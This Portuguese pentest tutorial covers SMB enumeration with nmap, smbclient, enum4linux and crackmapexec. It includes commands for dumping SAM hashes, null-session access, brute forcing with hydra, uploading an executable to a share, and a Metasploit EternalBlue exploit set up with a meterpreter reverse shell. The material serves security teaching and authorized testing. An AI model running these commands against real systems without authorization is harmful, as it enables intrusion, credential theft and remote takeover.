# Enumeração SMB

## Introdução

**SMB** (Server Message Block) é protocolo para compartilhamento de arquivos, impressoras e comunicação em redes Windows.

## Conceitos

### Portas
- 139/TCP: NetBIOS (antigo)
- 445/TCP: SMB direto (moderno)

### Versões
- SMB 1.0: Windows XP, Server 2003 (vulnerável)
- SMB 2.0: Windows Vista, Server 2008
- SMB 3.0: Windows 8+, Server 2012+

---

## Ferramentas

### nmap

```bash
# Detectar SMB
nmap -p 445 target

# Script SMB
nmap -p 445 --script smb-os-discovery target
nmap -p 445 --script smb-vuln-* target
nmap -p 445 --script smb-enum-shares target
```

### smbclient

```bash
# Instalação
sudo apt install smbclient

# Listar shares
smbclient -L \\\\target\\\\

# Conectar a share
smbclient \\\\target\\\\share

# Com credenciais
smbclient \\\\target\\\\share -U username
```

### enum4linux

```bash
# Instalação
sudo apt install enum4linux

# Enumeração completa
enum4linux target

# Sem bruteforce
enum4linux -m target

# Enumerar usuários
enum4linux -U target

# Enumerar shares
enum4linux -S target

# Enumerar grupos
enum4linux -G target
```

### crackmapexec

```bash
# Instalação
sudo apt install crackmapexec

# Verificar acesso
crackmapexec smb target

# Listar shares
crackmapexec smb target -u guest -p ''

# Dumpar SAM (hashes)
crackmapexec smb target -u admin -p pass --sam
```

---

## Enumeração Passo a Passo

### 1. Verificar Se SMB Está Aberto

```bash
nmap -p 445 target
telnet target 445
```

### 2. Detectar Versão

```bash
nmap -p 445 --script smb-os-discovery target

Resultado:
OS: Windows Server 2016 Standard
SMB Version: 3.1.1
```

### 3. Listar Compartilhamentos

```bash
smbclient -L \\\\target -N

# Resultado
Sharename        Type    Comment
---------        ----    -------
ADMIN$           Disk    Admin remotamente
C$               Disk    Compartilhamento padrão
IPC$             Pipe    Comunicação entre processos
Users            Disk    Dados de usuários
```

### 4. Enumerar Usuários

```bash
enum4linux -U target

Resultado:
S-1-5-21-xxx User: Administrator
S-1-5-21-xxx User: Guest
S-1-5-21-xxx User: john
S-1-5-21-xxx User: admin
```

### 5. Enumerar Grupos

```bash
enum4linux -G target

Resultado:
Administrators
Users
Guests
Remote Desktop Users
```

---

## Vulnerabilidades Comuns

### EternalBlue (CVE-2017-0144)

```bash
# Scanner
nmap -p 445 --script smb-vuln-ms17-010 target

# Verificar com MSF
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target
run
```

### Null Session

```bash
# Conectar sem credenciais
smbclient \\\\target\\\\IPC$ -N

# Enum sem auth
enum4linux -N target
```

### Null Share

```bash
# Compartilhamento sem senha
smbclient \\\\target\\\\Users -N
```

---

## Acesso a Compartilhamentos

### Descobrir Dados Sensíveis

```bash
# Conectar
smbclient \\\\target\\\\Users

# Listar arquivos
ls

# Baixar arquivo
get documento.txt

# Upload arquivo
put arquivo.exe
```

### Buscar Arquivos Sensíveis

```bash
find . -name "password*"
find . -name "*.txt"
find . -name "*.xlsx"
```

---

## Credential Stuffing

### Com Nmap

```bash
nmap -p 445 --script smb-brute target
```

### Com Hydra

```bash
hydra -l admin -P wordlist.txt smb://target
```

---

## Exploração

### Metasploit

```bash
msfconsole

# Usar exploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run
```

---

## Checklist de Enumeração SMB

```
☐ Verificar se porta 445 está aberta
☐ Identificar versão SMB
☐ Listar compartilhamentos
☐ Enumerar usuários
☐ Enumerar grupos
☐ Verificar permissões
☐ Testar acesso sem credenciais
☐ Verificar vulnerabilidades conhecidas
☐ Documentar achados
```

---

Próximo: `ftp-enum.md`
